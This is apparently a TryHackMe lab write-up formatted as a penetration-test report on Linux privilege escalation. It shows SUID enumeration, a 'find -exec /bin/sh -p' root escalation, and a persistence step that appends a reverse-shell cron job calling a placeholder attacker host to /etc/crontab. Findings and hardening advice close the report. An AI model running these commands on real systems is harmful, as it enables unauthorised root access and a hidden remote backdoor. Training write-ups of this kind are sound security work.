#  Vulnerability Assessment & Penetration Testing Report

##  Engagement Details

- **Target Machine:** 10.49.190.173
- **Platform:** TryHackMe
- **Environment:** Linux (Debian 2.6.32 Kernel)
- **Attacker Machine:** Kali Linux
- **Assessment Type:** Privilege Escalation Lab


# Executive Summary

A security assessment was conducted on the target Linux machine. Initial access was obtained via SSH using valid credentials. Post-exploitation enumeration revealed multiple privilege escalation vectors, including SUID misconfigurations and outdated kernel vulnerabilities. Successful exploitation resulted in full root access, demonstrating critical security weaknesses in system configuration and patch management.



#  Scope & Objectives

- Gain initial access to the system
- Perform enumeration for privilege escalation
- Exploit misconfigurations and vulnerabilities
- Achieve root-level access
- Establish persistence
- Document findings

#  Methodology

The assessment followed standard penetration testing phases:

1. Initial Access
2. Enumeration
3. Privilege Escalation
4. Persistence
5. Documentation

#  Exploitation Walkthrough

##  Step 1: Initial Access via SSH

ssh user@10.49.190.173 -oHostKeyAlgorithms=+ssh-rsa

![[ssh_access.png]]


## Step 2: Enumeration

User home directory contents:

ls

Output:

myvpn.ovpn  tools

Further inspection:

ls tools

Output:

kernel-exploits  mysql-udf  nginx  privesc-scripts  sudo  suid
![[tools_directory.png]]


##  Step 3: System Analysis

Kernel version identified:

uname -a

Output:

Linux debian 2.6.32-5-amd64

 This kernel is outdated and vulnerable to multiple exploits.

![[kernel_version.png]]

## 💥 Step 4: Privilege Escalation (SUID Exploit)

Enumerated SUID binaries:

find / -perm -4000 -type f 2>/dev/null

![[suid_enum.png]]


### Exploitation Using `find`

find . -exec /bin/sh -p \; -quit

##  Step 5: Root Access Achieved

Verification:

id

Output:

uid=0(root) gid=0(root) groups=0(root)

![[exploit_execution.png]]
![[root_access.png]]

#  Persistence Mechanism

## Cron Job Backdoor

 
echo "* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1'" >> /etc/crontab





##  Persistence Summary 

Persistence was achieved by adding a malicious cron job that executes a reverse shell at regular intervals. This ensures continued access to the compromised system even after reboot. By leveraging legitimate scheduling services, the attacker maintains stealth while preserving reliable remote control over the target machine.


#  Findings Summary

|ID|Vulnerability|Severity|Description|
|---|---|---|---|
|010|SUID Misconfiguration|Critical|Misconfigured SUID binary allowed privilege escalation|
|011|Outdated Kernel|High|Kernel version vulnerable to known exploits|
|012|Insecure File Structure|Medium|Sensitive tools exposed to low-privileged user|



#  CVSS Scoring

- **SUID Exploit:** 9.8 (Critical)
- **Kernel Vulnerability:** 8.4 (High)
- **Misconfiguration Exposure:** 6.5 (Medium)


# Recommendations

###  Immediate Fixes

- Remove unnecessary SUID permissions
- Patch and upgrade Linux kernel
- Restrict access to sensitive directories

###  Hardening Measures

- Implement least privilege principle
- Monitor cron jobs and scheduled tasks
- Enable file integrity monitoring (FIM)
- Conduct regular vulnerability scans